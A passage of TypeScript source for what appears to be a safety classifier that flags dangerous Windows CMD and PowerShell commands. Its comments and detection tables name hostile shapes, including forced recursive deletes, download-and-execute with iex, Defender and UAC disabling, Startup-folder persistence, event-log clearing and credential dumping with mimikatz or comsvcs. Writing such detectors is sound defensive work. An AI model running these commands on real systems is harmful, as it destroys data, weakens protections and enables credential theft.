	const shaped = URL_SHAPE_RE.exec(candidate);
	const url = shaped ? shaped[1] : candidate;
	if (!/^https?:\/\//i.test(url)) return undefined;
	try {
		const parsed = new URL(url);
		return parsed.protocol === "http:" || parsed.protocol === "https:" ? url : undefined;
	} catch {
		return undefined;
	}
}

function argsHaveUrl(args: string[]): boolean {
	return args.some((arg) => looksLikeUrl(arg) !== undefined);
}

/** `Remove-Item -Force` and the aliases that mean the same thing. */
const DELETE_CMDLETS = new Set(["remove-item", "ri", "rm", "del", "erase", "rd", "rmdir"]);
const SEGMENT_SEPARATORS = /[;|&\n\r\t]/;
const SOFT_SEPARATORS = /[{}()[\],;]/;

// Long-form design notes: docs/dev/command-classifier.md
/** The command segments of a Windows invocation, with the punctuation that can glue a word to its neighbours split off. */
function windowsSegments(tokens: string[]): string[][] {
	const segments: string[][] = [[]];
	for (const token of tokens) {
		const pieces = token.split(SEGMENT_SEPARATORS);
		for (let i = 0; i < pieces.length; i++) {
			const piece = pieces[i].trim();
			if (i < pieces.length - 1) {
				if (piece) segments[segments.length - 1].push(piece);
				segments.push([]);
			} else if (piece) {
				segments[segments.length - 1].push(piece);
			}
		}
	}

	return segments.map((segment) =>
		segment.flatMap((token) => token.split(SOFT_SEPARATORS).map((word) => word.trim())).filter(Boolean),
	);
}

/**
 * A delete cmdlet and a force flag in the *same* command segment.
 *
 * The segmenting is the point: `Remove-Item x; Write-Host -Force` has both
 * words and deletes nothing, and flagging it would be the classifier crying
 * wolf often enough that a user learns to dismiss it.
 */
/**
 * The spellings of `-Force` that PowerShell actually binds.
 *
 * Measured on all seven names in `DELETE_CMDLETS` — they are aliases of one
 * cmdlet, and each one was run rather than assumed, against a directory this
 * repository created for the purpose: `-Force`, `-Forc`, `-For` and `-Fo` each
 * deleted it, `-Force:$true` and `-fo:$true` each deleted it, `-F` failed with
 * `AmbiguousParameter` (`-Filter` is also an `F`), and `-foo` failed with
 * `NamedParameterNotFound`.
 *
 * That pair is the reason this is the set PowerShell accepts rather than a
 * `startsWith("-fo")`: the shorter rule would flag commands that fail to parse,
 * and `-F` — the spelling a person reaches for first — has to stay out, because
 * including it would mean this file claims a delete that PowerShell refuses to
 * perform. The two-character prefix is what `shortest` leaves off.
 */
const FORCE_PARAMETER_SPELLINGS = switchPrefixes("force", 3);

/** `-Force` in any spelling PowerShell binds, with or without a value. */
function isForceParameter(word: string): boolean {
	// `-Force:$true` binds the way `-Force` does, and `-F:$true` is exactly as
	// ambiguous as `-F`, so the value is split off before the spelling is read.
	return FORCE_PARAMETER_SPELLINGS.has(word.toLowerCase().split(":", 1)[0]);
}

function hasForceDeleteCmdlet(tokens: string[]): boolean {
	return windowsSegments(tokens).some((segment) => {
		let hasDelete = false;
		let hasForce = false;
		for (const word of segment) {
			if (DELETE_CMDLETS.has(word.toLowerCase())) hasDelete = true;
			if (isForceParameter(word)) hasForce = true;
		}
		return hasDelete && hasForce;
	});
}

/**
 * The spellings this function reads as running a string as PowerShell code.
 *
 * `iex` is the documented alias of `Invoke-Expression`. `Invoke-Expr` is not a
 * name PowerShell defines, and is here because a word that is nearly the
 * dangerous one is worth a question rather than a run.
 */
const EVAL_CMDLETS = new Set(["invoke-expression", "invoke-expr", "iex"]);

// Long-form design notes: docs/dev/command-classifier.md
/** The names a fetch is read under, each used only inside a segment found to be an eval cmdlet. */
const FETCH_CMDLETS = new Set([
	"invoke-webrequest",
	"iwr",
	"invoke-restmethod",
	"irm",
	"start-bitstransfer",
	"curl",
	"wget",
]);

/**
 * Code that was written somewhere else being run here.
 *
 * Three shapes, in the order they are reported:
 *
 * - **Fetch into eval.** A fetch cmdlet, a URL and an eval cmdlet in one
 *   segment is the download-and-execute idiom, and the pair is what makes it
 *   one. Either half alone is ordinary, so neither half is a rule. In
 *   `iwr https://… | iex` the `|` splits the line first, so this shape is the
 *   one that arrives glued instead — `iex (iwr https://…)`.
 * - **Eval on its own.** `Invoke-Expression` runs a string as code, which is
 *   `eval` with a different spelling, and it is a rule on its own because
 *   there is no argument that makes it safe. It is also what catches the
 *   `iex` at the end of a `| iex` pipeline, which the pair rule above never
 *   sees because the `|` has already put the two halves in different
 *   segments.
 * - **Dot-sourcing.** `. .\setup.ps1` runs a file's contents as code. The
 *   token has to be *only* a dot: `./setup.ps1`, `.\setup.ps1`, `..` and `.5`
 *   all begin with one and are not it.
 *
 * Each is read at the *head* of a segment and by whole word, so neither
 * `Write-Output iex` nor `Select-String iwr` matches: an alias that is an
 * argument is a pattern or a message, not a command.
 *
 * Each of these three was added here rather than inherited: the PowerShell rules
 * above them cover URL/launcher shapes and the forced delete, and none of these
 * is either. They are listed separately so a reader can see which is which.
 */
/**
 * The execution policies that stop checking whether a script should run.
 *
 * Measured on this machine, from
 * `[Enum]::GetNames([Microsoft.PowerShell.ExecutionPolicy])`:
 * `Unrestricted, RemoteSigned, AllSigned, Restricted, Default, Bypass, Undefined`.
 * Only three of the seven belong here. `Restricted` refuses to run any script
 * that is not signed, `AllSigned` requires all of them to be, `RemoteSigned`
 * requires local ones to be, and `Default` means "whatever the machine is set
 * to" — flagging any of those would flag a machine being made *safer*.
 */
const WEAK_EXECUTION_POLICIES = new Set(["unrestricted", "bypass", "undefined"]);

// Long-form design notes: docs/dev/command-classifier.md
/** A registry path that runs something every time the machine starts. */
function isRunKeyPath(token: string): boolean {
	return /\\currentversion\\run(once)?\b/i.test(token);
}

/**
 * Is this argument a path inside the per-user Startup folder?
 *
 * The filesystem counterpart to {@link isRunKeyPath}. A registry Run value and a
 * `.lnk` or `.bat` dropped in `%APPDATA%\…\Startup` are the same persistence
 * claim by two different doors: the first launches at logon by the registry
 * reading it, the second because Explorer runs everything in that folder. The
 * Run-key half was covered and this half had no rule, so
 * `copy /y payload.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"`
 * was `null`.
 *
 * Matched on the `…\Startup` tail in the `%APPDATA%` and `$env:APPDATA` spellings a
 * real command uses, because those are what arrives on the command line — the
 * variable is not expanded here and must not be, since a rule that required a
 * resolved `C:\Users\someone\…` would miss the form people actually type.
 *
 * **The trailing boundary is `(\\|$)`, and the difference is the whole rule.**
 * `copy /y payload.bat "%APPDATA%\…\Startup"` names the *folder* — there is no
 * filename after it — so a pattern requiring a separator followed by a name
 * matched only the `…\Startup\evil.bat` form and returned null for the more common
 * one. `\b` is the wrong boundary in the other direction: it fires between `p` and
 * `B` in `StartupBackup`, so a sibling folder would be caught. Requiring either the
 * end of the string or a `\` after `startup` excludes the longer word, because a
 * `\w` sits where the `\` would have to be.
 */
function isStartupFolderPath(token: string): boolean {
	// `\startup` at the end of the path, OR `\startup\anything` (a file dropped in
	// it). A longer word like `StartupBackup` has a `\w` right after `startup`, so
	// it fails both alternatives. The bare-`\startup` alternative is what catches
	// `copy …\Startup`, where the folder itself is the destination.
	//
	// The longer `…\Start Menu\Programs\Startup` spelling was tried and removed: it
	// is subsumed by the plain `\startup` tail, because every path that begins with
	// it also ends in `\Startup`. Measured — a mutation that drops the long
	// alternative changes no row's verdict, so it was redundant rather than load-
	// bearing, and keeping it would be a branch no test could tell from the other.
	//
	// `\b` is NOT a substitute for the `(?:\\|$)` boundary, and the reason is the
	// opposite of the obvious one: `\b` matches word-to-NON-word, and the `B` in
	// `StartupBackup` is a word character, so `\startup\b` misses that sibling just
	// the same. The two spellings agree on every path shape here, which is why no
	// test can tell them apart. `(?:\\|$)` is kept because it states the intent —
	// the next segment must be a directory or nothing — instead of leaning on a
	// reader's recall of what `\b` means between two word characters.
	//
	// The `/i` is belt-and-braces: the parameter is `lower`, so the whole Windows
	// line is folded before this runs and `Startup` has already become `startup`.
	// A mutation that removes the flag therefore stays green. It is kept anyway,
	// matching `isRunKeyPath` beside it, because a predicate that only works on
	// pre-folded input is a trap for the next caller — and the cost of keeping it
	// is one character, against the cost of a reader assuming the flag is load-
	// bearing when it is not.
	return /\\startup(?:\\|$)/i.test(token);
}

// Long-form design notes: docs/dev/command-classifier.md
/** The value names that decide whether UAC prompts, and how an administrator is prompted. */
function isUacValueName(token: string): boolean {
	return (
		/(?:^|[:.-])(?:enable|disable)lua\b/i.test(token) ||
		/consentpromptbehavioradmin|promptonsecuredesk|enableinstallerdetection/i.test(token)
	);
}

// Long-form design notes: docs/dev/command-classifier.md
/** Is this argument the `Policies\System` key itself? */
function isUacPolicyKey(token: string): boolean {
	return /\\policies\\system$/i.test(token);
}

// Long-form design notes: docs/dev/command-classifier.md
/** Is this argument one of the two Windows Defender policy keys that hold a protection switch? */
function isDefenderPolicyKey(token: string): boolean {
	return /\\policies\\microsoft\\windows defender\\(?:real-time protection|smartscreen)$/i.test(token);
}

// Long-form design notes: docs/dev/command-classifier.md
/** Is this argument the `Start` value of a service key? */
function isServiceStartValue(token: string): boolean {
	return /^start$/i.test(token);
}

// Long-form design notes: docs/dev/command-classifier.md
/** Is this argument the root of a registry hive that holds credentials? */
function isCredentialHiveKey(token: string): boolean {
	if (/\\(?:sam|system|security)$/i.test(token)) return true;
	// A backslash on both sides of the name, so `SAMPLES\Anything` is not `SAM`
	// and `SECURITYX` is not `SECURITY`. The `$` above is what does that job for a
	// hive; this is what does it for a child.
	if (/\\(?:sam|security)\\/i.test(token)) return true;
	return /\\system\\(?:(?:currentcontrolset|controlset\d+)\\)?control\\lsa(?:\\|$)/i.test(token);
}

// Long-form design notes: docs/dev/command-classifier.md
/** Cmdlets that turn a protection off, and nothing else. */
function powershellWeakeningRules(lower: string[]): DangerousCommandMatch | null {
	for (const segment of windowsSegments(lower)) {
		const head = segment[0];
		if (head === undefined) continue;

		if (head === "set-executionpolicy" && segment.some((w) => WEAK_EXECUTION_POLICIES.has(w))) {
			return { kind: "Other", rule: "PowerShell `Set-ExecutionPolicy` turning script checking off" };
		}
		if (head === "set-mppreference" && segment.some((w) => w.startsWith("-disable"))) {
			// The parameter is flagged whatever its value is, and that includes
			// `-DisableRealtimeMonitoring $false`, which turns Defender back on.
			// Telling those apart means reading the value, and the value may be
			// glued (`-DisableX:$false`), separate (`-DisableX $false`) or absent —
			// and absent means "use the default", which for a `Disable*` parameter
			// is the disabling one. A rule that guessed would be wrong in the
			// direction that matters: skipping the absent case is a hole.
			return { kind: "Other", rule: "PowerShell `Set-MpPreference` on a `Disable*` setting" };
		}
		// Long-form design notes: docs/dev/command-classifier.md
		if ((head === "add-mppreference" || head === "set-mppreference") && segment.some((w) => w.includes("exclusion"))) {
			return { kind: "Other", rule: "PowerShell excluding a path from Defender scanning" };
		}
		if (head === "disable-localuser") {
			return { kind: "Other", rule: "PowerShell `Disable-LocalUser`, which locks an account out" };
		}
		if (head === "unblock-file") {
			return {
				kind: "Other",
				rule: "PowerShell `Unblock-File`, which strips the mark-of-the-web off a downloaded file",
			};
		}
		// Long-form design notes: docs/dev/command-classifier.md
		if (segment.some(isStartupFolderPath)) {
			return { kind: "Other", rule: "copying a file into the Startup folder, which runs at every logon" };
		}
		// Long-form design notes: docs/dev/command-classifier.md
		if (head === "set-itemproperty" || head === "new-itemproperty" || head === "set-item" || head === "new-item") {
			if (segment.some(isRunKeyPath)) {
				return { kind: "Other", rule: "PowerShell writing a value to a key that runs at startup" };
			}
			if (segment.some(isUacPolicyKey) && segment.some(isUacValueName)) {
				return { kind: "Other", rule: "PowerShell writing `EnableLUA`, the value the UAC prompt reads" };
			}
		}
	}
	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** Ending a process, with or without `-Force`. */
function powershellTerminationRules(lower: string[]): DangerousCommandMatch | null {
	for (const segment of windowsSegments(lower)) {
		// Long-form design notes: docs/dev/command-classifier.md
		if (segment[0] === "stop-process") {
			return { kind: "Other", rule: "PowerShell `Stop-Process`, which ends a process" };
		}
		if (segment[0] === "stop-service") {
			return { kind: "Other", rule: "PowerShell `Stop-Service`, which stops a system service" };
		}
		if (segment[0] === "stop-computer" || segment[0] === "restart-computer") {
			return { kind: "Other", rule: `PowerShell \`${segment[0]}\`, which powers the machine off or restarts it` };
		}
	}
	return null;
}

function powershellExecutionRules(lower: string[]): DangerousCommandMatch | null {
	for (const segment of windowsSegments(lower)) {
		const head = segment[0];
		if (head === undefined) continue;
		if (head === ".") {
			return { kind: "Other", rule: "PowerShell dot-sourcing a script with `.`" };
		}
		if (!EVAL_CMDLETS.has(head)) continue;
		if (segment.some((word) => FETCH_CMDLETS.has(word)) && segment.some((word) => looksLikeUrl(word) !== undefined)) {
			return { kind: "Other", rule: "PowerShell fetching a URL and running it" };
		}
		return { kind: "Other", rule: "PowerShell `Invoke-Expression` running a string as code" };
	}
	return null;
}

function dangerousPowershellWords(words: string[]): DangerousCommandMatch | null {
	const lower = words.map(bareWord);
	const hasUrl = argsHaveUrl(words);

	const launcher = lower.some(
		(t) =>
			t === "start-process" ||
			t === "start" ||
			t === "saps" ||
			t === "invoke-item" ||
			t === "ii" ||
			t.includes("start-process") ||
			t.includes("invoke-item"),
	);
	if (hasUrl && launcher) {
		return { kind: "Other", rule: "PowerShell handing a URL to a launcher (`Start-Process`/`Invoke-Item`)" };
	}

	if (hasUrl && lower.some((t) => t.includes("shellexecute") || t.includes("shell.application"))) {
		return { kind: "Other", rule: "PowerShell reaching `ShellExecute` with a URL" };
	}

	const first = lower[0];
	if (first !== undefined) {
		if (first === "rundll32" && lower.some((t) => t.includes("url.dll,fileprotocolhandler")) && hasUrl) {
			return { kind: "Other", rule: "`rundll32 url.dll,FileProtocolHandler` with a URL" };
		}
		if (first === "mshta" && hasUrl) {
			return { kind: "Other", rule: "`mshta` with a URL" };
		}
		if (BROWSER_EXECUTABLES.has(first) && hasUrl) {
			return { kind: "Other", rule: "a browser executable invoked with a URL" };
		}
		if ((first === "explorer" || first === "explorer.exe") && hasUrl) {
			return { kind: "Other", rule: "`explorer` with a URL" };
		}
	}

	if (hasForceDeleteCmdlet(lower)) {
		return { kind: "Other", rule: "a delete cmdlet with `-Force`" };
	}
	return (
		powershellExecutionRules(lower) ??
		powershellWeakeningRules(lower) ??
		powershellTerminationRules(lower) ??
		powershellAdminCmdletRules(lower)
	);
}

/** Split a CMD token on the operators that can be written inside one word. */
function splitCmdOperators(token: string): string[] {
	return token.split(/(&&|\|\||[&|])/).filter((part) => part.trim().length > 0);
}

const CMD_SEPARATORS = new Set(["&", "&&", "|", "||"]);

// Long-form design notes: docs/dev/command-classifier.md
/** The switches that introduce a CMD body, and that a body may itself open with. */
const CMD_BODY_SWITCHES = new Set(["/c", "/k", "/r", "-c"]);

function dangerousCmd(tokens: string[], depth = 0): DangerousCommandMatch | null {
	// A body may open with another `cmd`, and each one runs whatever comes after
	// it: measured, `cmd /c cmd /c rd /s /q C:\x` and `cmd /c cmd /k rd /s /q
	// C:\x` both deleted, and so did the quoted form `cmd /c "cmd /c rd /s /q
	// C:\x"` — which is why this re-enters rather than being a second reading of
	// the same words. The body has already been split above, so the words reaching
	// here are the ones the next shell would see.
	if (depth > MAX_DANGEROUS_COMMAND_WRAPPER_DEPTH) {
		return { kind: "Other", rule: `nested deeper than ${MAX_DANGEROUS_COMMAND_WRAPPER_DEPTH} wrappers` };
	}
	if (tokens.length === 0) return null;
	const program = executableName(tokens[0], "windows");
	if (program !== "cmd" && program !== "cmd.exe") return null;

	// Skip the switches up to `/c`; an unrecognized word before the body means
	// this is not the shape this reads.
	const rest = tokens.slice(1);
	let i = 0;
	for (; i < rest.length; i++) {
		const lower = rest[i].toLowerCase();
		if (CMD_BODY_SWITCHES.has(lower)) break;
		if (lower.startsWith("/")) continue;
		return null;
	}
	// One switch does not end the switches. `cmd /k /c rd /s /q C:\x` runs the
	// delete through the inner `/c` and then leaves a prompt open, so a second
	// switch between the one that was found and the body is the same body
	// starting one word later. Only these switches are skipped; an unrecognized
	// `/x` still falls through to the word after it and ends the shape, which
	// is what the loop above decides.
	let start = i + 1;
	while (start < rest.length && CMD_BODY_SWITCHES.has(rest[start].toLowerCase())) start++;
	const body = rest.slice(start);
	if (body.length === 0) return null;

	const words = (body.length === 1 ? (body[0].split(/\s+/).filter(Boolean) as string[]) : body).flatMap(
		splitCmdOperators,
	);
	// Long-form design notes: docs/dev/command-classifier.md
	const nested = words.length > 0 ? executableName(words[0], "windows") : undefined;
	if (nested === "cmd" || nested === "cmd.exe") {
		const match = dangerousCmd(words, depth + 1);
		if (match) return match;
	}
	// Long-form design notes: docs/dev/command-classifier.md
	const bodyProgram = executableName(words[0] ?? "", "windows");
	if (bodyProgram !== undefined && POWERSHELL_EXECUTABLES.has(bodyProgram)) {
		const match = dangerousPowershellWords(powershellWords(words));
		if (match) return match;
	}
	const tool = developmentToolRules(words, "windows");
	if (tool) return tool;
	return (
		dangerousCmdBody(words) ?? dangerousPowershellWords(words) ?? directGuiLaunch(words) ?? dangerousWindowsAdmin(words)
	);
}

// Long-form design notes: docs/dev/command-classifier.md
/** The CMD builtins, read over one command's words. */
function dangerousCmdBody(words: string[]): DangerousCommandMatch | null {
	let segment: string[] = [];
	for (const word of words) {
		if (CMD_SEPARATORS.has(word)) {
			const match = dangerousCmdSegment(segment);
			if (match) return match;
			segment = [];
			continue;
		}
		segment.push(word);
	}
	// Long-form design notes: docs/dev/command-classifier.md
	return dangerousCmdSegment(segment);
}

/** What one CMD segment's words match, or `null` for the ordinary ones. */
function dangerousCmdSegment(segment: string[]): DangerousCommandMatch | null {
	// A `cmd /c` body arrives here as a word array that the strips in
	// `matchTokens` never touched, so a control word inside one is still sitting
	// at the head of its segment: `cmd /c if exist C:\x rd /s /q C:\y` and
	// `cmd /c for /f %i in (x) do del /f C:\y` both measured as running the
	// delete, and both were read as the word `if` and the word `for`.
	const controlled = stripControlWords(segment);
	if (controlled !== undefined) return dangerousCmdSegment(controlled);

	const head = segment[0]?.toLowerCase();
	if (head === undefined) return null;
	if (head === "start" && argsHaveUrl(segment)) {
		return { kind: "Other", rule: "`start` with a URL" };
	}
	const hasFlag = (flag: string) => segment.some((t) => hasCmdFlag(t, flag));
	// Long-form design notes: docs/dev/command-classifier.md
	if ((head === "del" || head === "erase") && hasFlag("/s") && hasFlag("/q")) {
		return { kind: "Other", rule: `\`${head} /s /q\` (silent recursive delete)` };
	}
	if ((head === "del" || head === "erase") && hasFlag("/f")) {
		return { kind: "Other", rule: "`del /f` (forced delete)" };
	}
	if ((head === "rd" || head === "rmdir") && hasFlag("/s") && hasFlag("/q")) {
		return { kind: "Other", rule: "`rd /s /q` (silent recursive delete)" };
	}
	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** Does one CMD token carry a `/switch`, however the switch was spelled? */
function hasCmdFlag(token: string, flag: string): boolean {
	const pieces = token.toLowerCase().split("/").slice(1);
	if (pieces.some((piece) => !/^[a-z0-9]$/.test(piece))) return false;
	return pieces.includes(flag.slice(1));
}

// Long-form design notes: docs/dev/command-classifier.md
/** Argument schemes that are *executed* rather than *fetched*. */
const SCRIPT_URI_RE = /^[\s"'([]*(?:javascript|vbscript)\s*:|^[\s"'([]*data\s*:\s*text\/html\b/i;

/** Does one of these arguments start a scheme the program will execute rather than fetch? */
function hasScriptUri(args: string[]): boolean {
	return args.some((arg) => SCRIPT_URI_RE.test(arg));
}

/** A GUI app or protocol handler launched directly with a URL in its argv. */
function directGuiLaunch(tokens: string[]): DangerousCommandMatch | null {
	const program = executableName(tokens[0], "windows");
	if (program === undefined) return null;
	const rest = tokens.slice(1);
	const hasUrl = argsHaveUrl(rest);
	const hasScript = hasScriptUri(rest);

	if ((program === "explorer" || program === "explorer.exe") && hasUrl) {
		return { kind: "Other", rule: "`explorer` with a URL" };
	}
	// Long-form design notes: docs/dev/command-classifier.md
	if ((program === "mshta" || program === "mshta.exe") && (hasUrl || hasScript)) {
		return {
			kind: "Other",
			rule: hasScript ? "`mshta` with a script URI, which runs the text in the argument" : "`mshta` with a URL",
		};
	}
	// `rundll32` is here for the same reason and reads the same way. Not measured
	// either: `rundll32.exe` is 98304 bytes and its strings give up nothing about
	// argument parsing — no switch names, no scheme table — so this rests on the
	// program handing its argument to a handler rather than on anything observed
	// here.
	if ((program === "rundll32" || program === "rundll32.exe") && hasScript) {
		return { kind: "Other", rule: "`rundll32` with a script URI, which runs the text in the argument" };
	}
	if (
		(program === "rundll32" || program === "rundll32.exe") &&
		rest.some((t) => t.toLowerCase().includes("url.dll,fileprotocolhandler")) &&
		hasUrl
	) {
		return { kind: "Other", rule: "`rundll32 url.dll,FileProtocolHandler` with a URL" };
	}
	if (BROWSER_EXECUTABLES.has(program) && hasUrl) {
		return { kind: "Other", rule: "a browser executable invoked with a URL" };
	}
	return null;
}

/**
 * Windows-only checks.
 *
 * There is no PowerShell parser here. A real parse of these constructs needs a
 * tree-sitter grammar, and this repo has no equivalent of one, so what follows is
 * a token scan over the whole invocation rather than a walk of a parsed script
 * body. A constructed cmdlet (`& ("Remove-" + "Item") -Force`) is invisible to
 * it. That gap is a real limit of this function, not a bug in it, and it is
 * why the engine treats a match as something to stop and a non-match as only
 * ever "nothing was recognized", never "this is safe".
 */
/**
 * The argument words of a PowerShell invocation, with a script body opened up.
 *
 * The body of `-Command "…"` arrives as one token — correctly, since it *is* one
 * argument — but every rule above is a word rule, so a quoted script has to be
 * read as the sequence of words it is before a cmdlet and a flag can be found in
 * the same segment. Only the body is expanded. Every other argument is left
 * whole, because a quoted string that merely *mentions* `Remove-Item` is not a
 * command, and a classifier that reads it as one is one the user learns to
 * dismiss.
 *
 * `-EncodedCommand` is *not* expanded here, and that is a measured decision
 * rather than an oversight. `powershellScript` already reads an encoded body —
 * into the full rule set, which strictly includes the word rules below — and it
 * reaches the first script switch on the line, which is the one the host uses.
 * The only inputs this function could add are ones where an earlier switch has
 * already claimed the script slot and the encoded body therefore never runs.
 * Expanding it here would mean flagging `powershell -c "Get-Process" -enc <body>`
 * as dangerous, and PowerShell hands that `<body>` to `Get-Process` as an
 * argument rather than executing it.
 */
function powershellWords(tokens: string[]): string[] {
	const words: string[] = [];
	for (let i = 1; i < tokens.length; i++) {
		const lower = tokens[i].toLowerCase();
		if (POWERSHELL_COMMAND_SWITCH.has(lower) && i + 1 < tokens.length) {
			words.push(...tokens[i + 1].split(/\s+/).filter(Boolean));
			i++;
			continue;
		}
		words.push(tokens[i]);
	}
	return words;
}

function matchWindows(tokens: string[]): DangerousCommandMatch | null {
	const program = executableName(tokens[0], "windows");
	if (program !== undefined && POWERSHELL_EXECUTABLES.has(program)) {
		const match = dangerousPowershellWords(powershellWords(tokens));
		if (match) return match;
	}
	// Long-form design notes: docs/dev/command-classifier.md
	return (
		dangerousCmd(tokens) ??
		dangerousCmdBody(tokens) ??
		dangerousPowershellWords(tokens) ??
		directGuiLaunch(tokens) ??
		dangerousWindowsAdmin(tokens)
	);
}

// Long-form design notes: docs/dev/command-classifier.md
/** Windows administrative cmdlets, and the history-file shapes beside them. */
function powershellAdminCmdletRules(lower: string[]): DangerousCommandMatch | null {
	// Long-form design notes: docs/dev/command-classifier.md
	if (isHistoryRedirect(lower)) {
		return {
			kind: "Other",
			rule: "output redirected onto the shell history file, which erases the record of what ran",
		};
	}
	for (const segment of windowsSegments(lower)) {
		const head = segment[0];
		if (head === undefined) continue;

		const why = POWERSHELL_ADMIN_CMDLETS.get(head);
		if (why !== undefined) {
			// Long-form design notes: docs/dev/command-classifier.md
			if (head === "set-netfirewallprofile") {
				const reading = firewallEnabledReading(segment);
				if (reading === "off") {
					return { kind: "Other", rule: "PowerShell `Set-NetFirewallProfile` turning the firewall off" };
				}
				// Long-form design notes: docs/dev/command-classifier.md
				if (reading === "unreadable") {
					return {
						kind: "Other",
						rule: "PowerShell `Set-NetFirewallProfile` aiming the firewall at a value PowerShell will not accept, which it will reject before changing anything",
					};
				}
				// Long-form design notes: docs/dev/command-classifier.md
				if (reading === "on") continue;
			}
			// Long-form design notes: docs/dev/command-classifier.md
			if (segment.some(isDisablingParameter)) {
				return { kind: "Other", rule: `PowerShell \`${head}\` with a disabling parameter, which ${why}` };
			}
			return { kind: "Other", rule: `PowerShell \`${head}\`, which ${why}` };
		}

		// The PowerShell session's own history file, reached three ways. None is a
		// `POWERSHELL_ADMIN_CMDLETS` entry because none of them is destructive to
		// anything but a record: `Clear-Content` on a config file is ordinary work,
		// and `Remove-Item` is already caught by the force-delete rule wherever it
		// appears. What makes these worth naming is that they target the history.
		if (head === "clear-content" || head === "remove-item" || head === "clear-history" || head === "remove-history") {
			const names = segment.some(isShellHistoryPath);
			const clearsInMemory = head === "clear-history" || head === "remove-history";
			if (names || clearsInMemory) {
				return { kind: "Other", rule: "PowerShell clearing the shell history, which erases the record of what ran" };
			}
		}
	}
	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** Is a redirect operator aimed at the shell history file? */
function isHistoryRedirect(segment: string[]): boolean {
	for (let i = 0; i < segment.length; i++) {
		const token = segment[i];
		if (token === ">" || token === ">>") {
			const next = segment[i + 1];
			if (next !== undefined && isShellHistoryPath(next)) return true;
			continue;
		}
		// Glued: `>target`. Only a leading operator counts, so a token that merely
		// *contains* a `>` in the middle (`"a>b"`) is not a redirect target.
		const stripped = token.replace(/^>>?/, "");
		if (stripped !== token && isShellHistoryPath(stripped)) return true;
	}
	return false;
}

// Long-form design notes: docs/dev/command-classifier.md
/** What `-Enabled` asks for in this segment, or `undefined` when there is no `-Enabled` at all. */
function firewallEnabledReading(segment: string[]): FirewallEnabledReading | undefined {
	for (let i = 0; i < segment.length; i++) {
		const token = segment[i].toLowerCase();
		// Glued: `-Enabled:$false`.
		const glued = /^-(?:not)?enabled:(.+)$/.exec(token);
		if (glued !== null) return readFirewallValue(glued[1]);
		// The negated name on its own: `-NotEnabled`.
		if (token === "-notenabled") return "off";
		// Separate: `-Enabled False`. The next word has to be a value, so a
		// following parameter name means the value was left out.
		if (token === "-enabled") {
			const next = segment[i + 1]?.toLowerCase();
			if (next !== undefined && !next.startsWith("-")) return readFirewallValue(next);
		}
	}
	return undefined;
}

/** One `-Enabled` value, in the three readings. */
function readFirewallValue(value: string): FirewallEnabledReading {
	const trimmed = value.trim();
	if (POWERSHELL_FALSE_VALUES.has(trimmed)) return "off";
	if (POWERSHELL_TRUE_VALUES.has(trimmed)) return "on";
	return "unreadable";
}

// Long-form design notes: docs/dev/command-classifier.md
/** Does this argument name a shell history file? */
function isShellHistoryPath(token: string): boolean {
	const lower = token.toLowerCase();
	return lower.includes("consolehost_history.txt") || lower.includes("historysavepath");
}

// Long-form design notes: docs/dev/command-classifier.md
/** Windows administrative programs, and the verbs that make them destructive. */
const WINDOWS_ADMIN_VERBS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
	// Long-form design notes: docs/dev/command-classifier.md
	["reg", new Set(["delete", "load", "unload"])],
	["schtasks", new Set(["/delete", "/create", "/change", "/run"])],
	["sc", new Set(["config", "stop", "delete", "create"])],
	["vssadmin", new Set(["delete", "resize"])],
	["bcdedit", new Set(["/delete", "/set", "/import", "/create"])],
	["wevtutil", new Set(["cl", "del"])],
	["cipher", new Set(["/w"])],
	["bitsadmin", new Set(["/transfer", "/create", "/addfile"])],
	["netsh", new Set(["set", "delete", "add"])],
	["taskkill", new Set(["/f"])],
	// `net user` on its own prints every account on the machine, and
	// `net user <name>` prints one -- both measured as the listing commands they
	// are. What is not a listing is `/add`, which creates an account or a group,
	// and a bare `net user <name> <password>`, which resets one. The second shape
	// is caught by count rather than by a verb because the password is just a
	// word; see `dangerousWindowsAdmin`.
	["net", new Set(["/add"])],
	["icacls", new Set(["/grant", "/deny", "/remove", "/setowner", "/reset"])],
	// Long-form design notes: docs/dev/command-classifier.md
	["wmic", new Set(["delete", "terminate"])],
	// Long-form design notes: docs/dev/command-classifier.md
	["certutil", new Set(["-urlcache", "/urlcache"])],
	// Long-form design notes: docs/dev/command-classifier.md
	["robocopy", new Set(["/mir", "/purge"])],
	// Long-form design notes: docs/dev/command-classifier.md
	["comsvcs", new Set(["minidump", "minidumpw"])],
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Windows administrative programs where the program name is the whole story. */
const WINDOWS_ADMIN_ALWAYS: ReadonlyMap<string, string> = new Map([
	["format", "reformats a volume, which cannot be undone"],
	["diskpart", "runs a disk partitioning script, which can erase a volume"],
	["takeown", "takes ownership of files away from whoever had it"],
	["regsvr32", "registers a DLL as a COM server, which is arbitrary code that a later process loads"],
	["mimikatz", "extracts credentials out of a running Windows, and every mode it has is that"],
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Windows administrative cmdlets, and the acts the switch-shaped tools already cover. */
const POWERSHELL_ADMIN_CMDLETS: ReadonlyMap<string, string> = new Map([
	["clear-eventlog", "empties a Windows event log, which is the audit trail"],
	["remove-eventlog", "deletes a Windows event log outright"],
	["set-netfirewallprofile", "changes a firewall profile, including turning it off"],
	["set-netfirewallrule", "changes a firewall rule"],
	["new-netfirewallrule", "adds a firewall rule, which can open a port"],
	["remove-netfirewallrule", "removes a firewall rule"],
	["register-scheduledtask", "registers a task that runs on a trigger, which outlives the session"],
	["unregister-scheduledtask", "removes a registered task"],
	["disable-scheduledtask", "disables a scheduled task, which is the other half of schtasks /change /disable"],
	["clear-disk", "erases the contents of a disk"],
	["initialize-disk", "re-initializes a disk, which erases it"],
	// `set-executionpolicy` is deliberately NOT here. It looks like a member —
	// it is the PowerShell spelling of weakening script checking — but it is
	// already covered by a rule that reads the policy *value*, and that rule is
	// the better one: only three of the seven policies weaken anything, and
	// `RemoteSigned`, `AllSigned` and `Restricted` all make the machine
	// stricter. A table entry would have fired on the strictest policies there
	// are, which is the exact failure this file is written to avoid.
	["disable-windowsoptionalfeature", "removes a Windows feature"],
	// Long-form design notes: docs/dev/command-classifier.md
	["disable-bitlocker", "removes the volume's key protectors and starts decrypting it"],
	["disable-bitlockerautounlock", "removes the automatic unlocking keys, so the OS volume stops unlocking itself"],
